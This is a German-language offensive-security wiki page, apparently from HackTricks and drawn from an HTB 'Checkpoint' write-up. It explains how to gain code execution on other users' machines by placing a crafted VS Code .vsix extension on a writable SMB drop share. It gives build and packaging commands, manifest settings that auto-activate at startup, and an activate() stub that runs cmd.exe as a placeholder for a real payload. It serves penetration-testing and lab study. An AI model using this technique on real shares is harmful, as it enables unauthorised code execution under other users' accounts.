# Ausführung über einen VS Code-Extension-Drop-Share

{{#include ../banners/hacktricks-training.md}}

VS Code-Extensions und Visual Studio-VSSDK-Extensions verwenden beide `.vsix`-Pakete, haben jedoch unterschiedliche Manifeste und Laufzeitumgebungen. Eine beschreibbare SMB-drop share wird nur dann zu einem Ausführungspfad, **wenn** ein anderer Benutzer oder ein Deployment-Job ihre Pakete in VS Code installiert. Die `activate()`-Funktion der Extension wird dann im Extension Host mit den Berechtigungen dieses Benutzers ausgeführt. Das bloße Schreiben einer `.vsix` auf eine Freigabe führt sie nicht aus.<sup>[[1]](#references)[[2]](#references)</sup>

## Paketierungs- und Aktivierungsablauf

Prüfe zunächst die verwendete VS Code-Version und ob die Freigabe tatsächlich synchronisiert wird oder die Pakete daraus installiert werden. Erstelle eine TypeScript-Extension und füge die gewünschte Node.js-Aktion in `activate()` ein. Verwende ein Aktivierungsereignis, das ohne einen vom Benutzer ausgewählten Befehl ausgeführt wird, etwa `onStartupFinished`, und kompiliere und paketierte anschließend die Extension. `engines.vscode` ist die **Laufzeit-Kompatibilitätsschranke**; `@types/vscode` an die Ziel-API-Version anzupassen, ist eine Maßnahme zur Build-Zeit-Kompatibilität und keine Installationsanforderung.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

Für einen Editor, auf dem VS Code 1.118 läuft, sind die relevanten Felder in `package.json`:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

Eine minimale Prüfung in `activate()` kann einen Befehl ausführen und dessen Ausgabe aus dem Extension Host protokollieren. Ersetze die Testaktion erst, nachdem du überprüft hast, dass das Paket im erwarteten Konto bzw. in der erwarteten Sitzung aktiviert ist. Das Ereignis `onStartupFinished` tritt nach dem Start auf und ist daher kein Beleg für eine Ausführung, solange der Editor nicht tatsächlich gestartet und die Extension installiert und aktiviert ist.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

Ein Angreifer mit Schreibzugriff auf die Drop-Freigabe kann das getestete Paket hochladen und auf den Job warten, der es verwendet. Im Checkpoint-Beispiel ermöglichte der Share-Zugriff des wiederhergestellten Kontos diesen Schreibzugriff; das Konto mit niedrigen Privilegien, mit dem der Angriff begann, konnte die Freigabe nur lesen. Halte diese beiden Voraussetzungen auseinander. Verwende für **Visual Studio**-Erweiterungen das separate Kapitel [Visual Studio VSIX extension abuse](visual-studio-vsix-extension-abuse.md) statt dieses VS-Code-Workflows.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - Aktivierungsereignisse](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - Erweiterungen veröffentlichen](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
